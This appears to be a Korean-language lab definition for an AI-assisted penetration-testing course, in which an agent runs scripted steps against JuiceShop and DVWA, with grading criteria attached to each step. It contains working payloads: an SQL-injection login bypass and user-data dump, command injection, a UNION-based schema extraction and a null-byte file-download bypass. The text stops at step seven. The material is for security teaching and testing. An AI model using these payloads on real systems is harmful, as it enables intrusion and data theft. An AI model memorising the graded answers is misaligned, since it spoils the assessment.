lab_id: web-vuln-ai-week15
title: 종합 웹 해킹 실습 (AI 지원)
version: ai
course: web-vuln-ai
week: 15
description: 1~14주차 기법을 종합하여 JuiceShop과 DVWA에 대한 실전 침투 테스트 시나리오를 수행합니다. 정찰부터 권한 상승, 데이터 탈취, 보고서 작성까지 킬체인을
  완성합니다. AI SubAgent가 자동으로 명령을 실행하고 결과를 검증합니다.
difficulty: hard
duration_minutes: 180
objectives:
- 실전 침투 테스트의 전체 프로세스를 수행한다
- 다수의 취약점을 체인으로 연결하여 목표를 달성한다
- 전문 보안 진단 보고서를 작성한다
pass_threshold: 0.6
steps:
- order: 1
  instruction: nmap으로 대상 서버({{WEB_IP}})의 열린 포트와 서비스 버전을 스캔하시오. 웹 관련 포트와 기타 서비스를 식별하라.
  hint: nmap -sV -p 22,80,443,3000,3306,5432,6379,8080 {{WEB_IP}} 으로 주요 포트를 스캔하세요.
  category: recon
  points: 8
  answer: '🤖 프롬프트: nmap으로 대상 서버(10.20.30.80)의 열린 포트와 서비스 버전을 스캔해줘

    📎 참고 (CLI): nmap -sV -p 22,80,443,3000,3306,5432,6379,8080,8443,9200 10.20.30.80 2>/dev/null'
  answer_detail: 침투 테스트의 첫 단계는 대상의 공격 표면을 파악하는 것입니다. nmap -sV로 서비스 버전을 식별하면 CVE 데이터베이스에서 알려진 취약점을 검색할
    수 있습니다. 80(Apache+ModSecurity), 3000(JuiceShop), 8080(DVWA)이 주요 대상입니다.
  verify:
    type: output_contains
    expect: open
    field: stdout
    semantic:
      intent: nmap 포트/서비스 스캔 — 웹 관련 및 기타 서비스 식별
      success_criteria:
      - nmap -sV 로 주요 포트 결과
      - open 상태 포트 최소 3개 기록
      - 서비스 버전 정보 확인
      acceptable_methods:
      - nmap -sV -p- <target>
      - nmap -sV -p 22,80,443,3000,8080
      - masscan + nmap 조합
      - rustscan
      negative_signs:
      - 포트 몇 개만 확인
      - 버전 정보 누락
      - 결과 해석 없음
  target_vm: attacker
  script: nmap -sV -p 22,80,443,3000,3306,5432,6379,8080,8443,9200 10.20.30.80 2>/dev/null
  risk_level: low
  bastion_prompt: nmap으로 대상 서버(10.20.30.80)의 열린 포트와 서비스 버전을 스캔해줘
- order: 2
  instruction: 웹 애플리케이션 지문 수집(Fingerprinting)을 수행하시오. 각 포트의 서버 소프트웨어, 프레임워크, 기술 스택을 파악하라.
  hint: 각 포트에 curl -sI로 응답 헤더를 확인하고, HTML 소스에서 프레임워크 단서를 찾으세요.
  category: recon
  points: 8
  answer: '🤖 프롬프트: 웹 애플리케이션 지문 수집(Fingerprinting)을 수행해줘

    📎 참고 (CLI): echo ''=== Fingerprinting ==='' && echo ''[Port 80]''; curl -sI http://10.20.30.80:80
    | grep -iE ''(server|x-powered|x-frame)''; echo ''[Port 3000 - JuiceShop]''; curl -sI http://10.20.30.80:3000
    | grep -iE ''(server|x-powered)''; curl -s http://10.20.30.80:3000 | grep -oiE ''(angular|express|node|jquery)''
    | sort -u; echo ''[Port 8080 - DVWA]''; curl -sI http://10.20.30.80:8080 | grep -iE ''(server|x-powered)'';
    echo ''=== Fingerprint Complete ==='''
  answer_detail: 지문 수집은 대상의 기술 스택을 파악하여 적절한 공격 벡터를 선택하는 데 중요합니다. JuiceShop은 Node.js/Express/Angular, DVWA는
    PHP/Apache 기반입니다. 각 기술별로 특화된 공격 기법이 다릅니다.
  verify:
    type: output_contains
    expect: Fingerprint Complete
    field: stdout
    semantic:
      intent: 웹 지문 수집 — 포트별 서버·프레임워크·기술 스택 식별 (whatweb 등)
      success_criteria:
      - 2개 이상 포트에 whatweb 또는 수동 분석
      - 각 포트의 기술 스택 1개 이상 식별
      - 버전 기반 CVE 조회 가능성 언급
      acceptable_methods:
      - whatweb <url>:<port>
      - wappalyzer CLI
      - curl -I 로 Server 헤더
      - builtwith
      negative_signs:
      - 단일 포트만
      - 기술 스택 미식별
      - CVE 맥락 없음
  target_vm: attacker
  script: echo '=== Fingerprinting ===' && echo '[Port 80]'; curl -sI http://10.20.30.80:80 | grep -iE
    '(server|x-powered|x-frame)'; echo '[Port 3000 - JuiceShop]'; curl -sI http://10.20.30.80:3000 | grep
    -iE '(server|x-powered)'; curl -s http://10.20.30.80:3000 | grep -oiE '(angular|express|node|jquery)'
    | sort -u; echo '[Port 8080 - DVWA]'; curl -sI http://10.20.30.80:8080 | grep -iE '(server|x-powered)';
    echo '=== Fingerprint Complete ==='
  risk_level: low
  bastion_prompt: 웹 애플리케이션 지문 수집(Fingerprinting)을 수행해줘
- order: 3
  instruction: JuiceShop에 SQL Injection으로 관리자 인증을 우회하고, API를 통해 전체 사용자 목록과 민감 정보를 탈취하시오.
  hint: admin@juice-sh.op'-- 로 로그인한 후, /api/Users/ 엔드포인트에서 사용자 데이터를 추출하세요.
  category: exploit
  points: 12
  answer: '🤖 프롬프트: JuiceShop에 SQL Injection으로 관리자 인증을 우회하고, API를 통해 전체 사용자 목록과 민감 정보를 탈취해줘

    📎 참고 (CLI): echo ''=== Phase 1: SQLi Auth Bypass ==='' && TOKEN=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login
    -H ''Content-Type: application/json'' -d ''{"email":"admin@juice-sh.op\x27--","password":"a"}'' |
    python3 -c "import sys,json; print(json.load(sys.stdin).get(''authentication'',{}).get(''token'',''''))"
    2>/dev/null) && echo "Admin token: ${TOKEN:0:30}..."; echo ''=== Phase 2: User Data Exfil ==='' &&
    curl -s http://10.20.30.80:3000/api/Users/ -H "Authorization: Bearer $TOKEN" | python3 -c "import
    sys,json; [print(f''  User {u[\"id\"]}: {u.get(\"email\",\"?\")}''  ) for u in json.load(sys.stdin).get(''data'',[])]"
    2>/dev/null | head -10'
  answer_detail: '킬체인 1단계: SQL Injection으로 인증 우회 후 관리자 권한 획득. 2단계: 관리자 토큰으로 API에서 전체 사용자 정보(이메일, 패스워드
    해시)를 탈취. 실전에서는 이 해시를 hashcat/john으로 크래킹합니다.'
  verify:
    type: output_contains
    expect: Admin token
    field: stdout
    semantic:
      intent: JuiceShop SQLi 관리자 우회 → API 사용자 목록 탈취
      success_criteria:
      - SQLi 로 admin JWT 획득
      - /api/Users/ 요청으로 전체 사용자 응답
      - 이메일·해시 등 민감 필드 노출 확인
      acceptable_methods:
      - curl -X POST -d <sqli_payload> /rest/user/login
      - Burp Repeater
      - sqlmap --data --auth-type POST
      - python requests
      negative_signs:
      - 인증 우회 실패
      - 사용자 목록 조회 없음
      - 민감 필드 확인 없음
  target_vm: attacker
  script: 'echo ''=== Phase 1: SQLi Auth Bypass ==='' && TOKEN=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login
    -H ''Content-Type: application/json'' -d ''{"email":"admin@juice-sh.op\x27--","password":"a"}'' |
    python3 -c "import sys,json; print(json.load(sys.stdin).get(''authentication'',{}).get(''token'',''''))"
    2>/dev/null) && echo "Admin token: ${TOKEN:0:30}..."; echo ''=== Phase 2: User Data Exfil ==='' &&
    curl -s http://10.20.30.80:3000/api/Users/ -H "Authorization: Bearer $TOKEN" | python3 -c "import
    sys,json; [print(f''  User {u[\"id\"]}: {u.get(\"email\",\"?\")}''  ) for u in json.load(sys.stdin).get(''data'',[])]"
    2>/dev/null | head -10'
  risk_level: medium
  bastion_prompt: JuiceShop에 SQL Injection으로 관리자 인증을 우회하고, API를 통해 전체 사용자 목록과 민감 정보를 탈취해줘
- order: 4
  instruction: DVWA에서 Command Injection으로 서버 내부 정보를 수집하시오. 네트워크 인터페이스와 실행 중인 프로세스를 확인하라.
  hint: security=low에서 ip 파라미터에 세미콜론으로 ifconfig, ps aux 등을 연결하세요.
  category: exploit
  points: 12
  answer: "\U0001F916 프롬프트: DVWA에서 Command Injection으로 서버 내부 정보를 수집해줘\n\U0001F4CE 참고 (CLI): curl -s -c\
    \ /tmp/dvwa_final.txt \\\n  -d 'username=admin&password=password&Login=Login' http://10.20.30.80:8080/login.php\
    \ -L > /dev/null && echo '=== Network Info ===' && curl -s -b /tmp/dvwa_final.txt -b 'security=low'\
    \ --data-urlencode 'ip=127.0.0.1; ip addr show \\\n | grep inet' -d 'Submit=Submit' http://10.20.30.80:8080/vulnerabilities/exec/\
    \ | grep -oE 'inet [0-9./]+' | head -5; echo '=== Process List ===' && curl -s -b /tmp/dvwa_final.txt\
    \ -b 'security=low' --data-urlencode 'ip=127.0.0.1; ps aux | head -8' -d 'Submit=Submit' http://10.20.30.80:8080/vulnerabilities/exec/\
    \ | grep -oE '(root|www-data|mysql|node)[^ ]*.*' | head -8; echo '=== CMDi Complete ==='"
  answer_detail: Command Injection으로 내부 정보 수집(Post-Exploitation)을 수행합니다. 네트워크 인터페이스로 내부 네트워크 구조를, 프로세스
    목록으로 실행 중인 서비스와 권한을 파악합니다.
  verify:
    type: output_contains
    expect: Network Info
    field: stdout
    semantic:
      intent: DVWA Command Injection 으로 서버 내부 정보 수집 — 네트워크 인터페이스와 프로세스
      success_criteria:
      - ip 또는 ifconfig 주입 후 응답에서 인터페이스 확인
      - ps 또는 netstat 주입 후 프로세스 목록
      - 메타문자 사용 명확히 제시
      acceptable_methods:
      - curl -d ip=127.0.0.1;ip addr
      - curl -d ip=127.0.0.1|ps auxf
      - Burp Repeater
      - commix 자동화 도구
      negative_signs:
      - 단일 명령만
      - 주입 실패
      - 결과 해석 없음
  target_vm: attacker
  script: "curl -s -c /tmp/dvwa_final.txt \\\n  -d 'username=admin&password=password&Login=Login' http://10.20.30.80:8080/login.php\
    \ -L > /dev/null && echo '=== Network Info ===' && curl -s -b /tmp/dvwa_final.txt -b 'security=low'\
    \ --data-urlencode 'ip=127.0.0.1; ip addr show \\\n | grep inet' -d 'Submit=Submit' http://10.20.30.80:8080/vulnerabilities/exec/\
    \ | grep -oE 'inet [0-9./]+' | head -5; echo '=== Process List ===' && curl -s -b /tmp/dvwa_final.txt\
    \ -b 'security=low' --data-urlencode 'ip=127.0.0.1; ps aux | head -8' -d 'Submit=Submit' http://10.20.30.80:8080/vulnerabilities/exec/\
    \ | grep -oE '(root|www-data|mysql|node)[^ ]*.*' | head -8; echo '=== CMDi Complete ==='"
  risk_level: medium
  bastion_prompt: DVWA에서 Command Injection으로 서버 내부 정보를 수집해줘
- order: 5
  instruction: JuiceShop의 검색 API에서 UNION SELECT SQL Injection으로 데이터베이스 스키마를 추출하시오.
  hint: /rest/products/search?q= 파라미터에 UNION SELECT를 사용하세요. SQLite의 sqlite_master 테이블에서 스키마를 조회합니다.
  category: exploit
  points: 12
  answer: '🤖 프롬프트: JuiceShop의 검색 API에서 UNION SELECT SQL Injection으로 데이터베이스 스키마를 추출해줘

    📎 참고 (CLI): echo ''=== DB Schema Extraction ==='' && curl -s ''http://10.20.30.80:3000/rest/products/search?q=test%27))UNION+SELECT+sql,2,3,4,5,6,7,8,9+FROM+sqlite_master+WHERE+type=%27table%27--''
    | python3 -c "import sys,json; [print(d.get(''name'','''')[:80]) for d in json.load(sys.stdin).get(''data'',[])]"
    2>/dev/null | head -15 || curl -s ''http://10.20.30.80:3000/rest/products/search?q=test%27))UNION+SELECT+sql,2,3,4,5,6,7,8,9+FROM+sqlite_master--''
    | head -c 500'
  answer_detail: UNION SELECT로 sqlite_master 테이블을 조회하면 전체 데이터베이스의 테이블 구조(CREATE TABLE 문)를 확인할 수 있습니다.
    Users, Cards, Wallets 등의 테이블 구조를 파악한 후 민감 데이터를 선택적으로 추출합니다.
  verify:
    type: output_contains
    expect: DB Schema
    field: stdout
    semantic:
      intent: JuiceShop 검색 API UNION SELECT — information_schema.tables 로 DB 스키마 추출
      success_criteria:
      - 컬럼 수 매칭 후 UNION SELECT 실행
      - information_schema.tables 또는 sys.tables 결과 반환
      - 테이블명 최소 2개 식별
      acceptable_methods:
      - curl <url>/rest/products/search?q=<payload>
      - sqlmap --dbs --tables
      - Burp Intruder
      - python requests
      negative_signs:
      - UNION 없이 단순 검색
      - 컬럼 수 확인 없음
      - 스키마 추출 실패
  target_vm: attacker
  script: echo '=== DB Schema Extraction ===' && curl -s 'http://10.20.30.80:3000/rest/products/search?q=test%27))UNION+SELECT+sql,2,3,4,5,6,7,8,9+FROM+sqlite_master+WHERE+type=%27table%27--'
    | python3 -c "import sys,json; [print(d.get('name','')[:80]) for d in json.load(sys.stdin).get('data',[])]"
    2>/dev/null | head -15 || curl -s 'http://10.20.30.80:3000/rest/products/search?q=test%27))UNION+SELECT+sql,2,3,4,5,6,7,8,9+FROM+sqlite_master--'
    | head -c 500
  risk_level: medium
  bastion_prompt: JuiceShop의 검색 API에서 UNION SELECT SQL Injection으로 데이터베이스 스키마를 추출해줘
- order: 6
  instruction: JuiceShop의 /ftp 디렉터리에서 Null Byte Injection으로 접근 제한을 우회하여 민감 파일을 다운로드하시오.
  hint: /ftp 디렉터리의 파일 목록을 확인한 후, %2500(URL 인코딩된 Null Byte)으로 확장자 필터를 우회하세요.
  category: exploit
  points: 10
  answer: '🤖 프롬프트: JuiceShop의 /ftp 디렉터리에서 Null Byte Injection으로 접근 제한을 우회하여 민감 파일을 다운로드해줘

    📎 참고 (CLI): echo ''=== FTP Directory ==='' && curl -s http://10.20.30.80:3000/ftp/ | grep -oP ''href="[^"]+"''
    | head -10 && echo ''=== Null Byte Bypass ==='' && echo -n ''package.json.bak%2500.md: '' && curl
    -s -o /dev/null -w ''HTTP:%{http_code} (%{size_download}B)'' ''http://10.20.30.80:3000/ftp/package.json.bak%2500.md''
    && echo '''' && echo -n ''eastere.gg%2500.md: '' && curl -s -o /dev/null -w ''HTTP:%{http_code} (%{size_download}B)''
    ''http://10.20.30.80:3000/ftp/eastere.gg%2500.md'' && echo '''' && echo ''=== File Download Complete
    ==='''
  answer_detail: JuiceShop의 /ftp는 .md와 .pdf 확장자만 다운로드를 허용합니다. %2500은 URL 디코딩 후 %00(Null Byte)이 되어, 파일명이
    file.bak%00.md로 해석됩니다. 확장자 검증은 .md로 통과하지만 OS는 %00에서 자르므로 .bak 파일에 접근합니다.
  verify:
    type: output_contains
    expect: File Download Complete
    field: stdout
    semantic:
      intent: Null Byte Injection — /ftp/파일명%00.jpg 등으로 확장자 필터 우회하여 민감 파일 다운로드
      success_criteria:
      - '%00 Null Byte 포함 URL 시도'
      - 다운로드 성공 시 파일 내용 일부 출력
      - Null Byte 우회 원리 설명
      acceptable_methods:
      - curl <url>/ftp/file.md.txt%00.jpg
      - Burp Repeater 로 %00 포함
      - python requests + quote 함수
      - JuiceShop ftp challenge walkthrough
      negative_signs:
      - Null Byte 사용 없음
      - 파일 다운로드 실패
      - 우회 원리 설명 없음
  target_vm: attacker
  script: 'echo ''=== FTP Directory ==='' && curl -s http://10.20.30.80:3000/ftp/ | grep -oP ''href="[^"]+"''
    | head -10 && echo ''=== Null Byte Bypass ==='' && echo -n ''package.json.bak%2500.md: '' && curl
    -s -o /dev/null -w ''HTTP:%{http_code} (%{size_download}B)'' ''http://10.20.30.80:3000/ftp/package.json.bak%2500.md''
    && echo '''' && echo -n ''eastere.gg%2500.md: '' && curl -s -o /dev/null -w ''HTTP:%{http_code} (%{size_download}B)''
    ''http://10.20.30.80:3000/ftp/eastere.gg%2500.md'' && echo '''' && echo ''=== File Download Complete
    ==='''
  risk_level: medium
  bastion_prompt: JuiceShop의 /ftp 디렉터리에서 Null Byte Injection으로 접근 제한을 우회하여 민감 파일을 다운로드해줘
- order: 7
  instruction: sqlmap을 사용하여 DVWA의 SQL Injection을 자동화하시오. users 테이블의 데이터를 추출하라.
  hint: sqlmap -u 'URL' --cookie='...' --batch --dump -T users 형태로 실행하세요.
  category: exploit
  points: 12
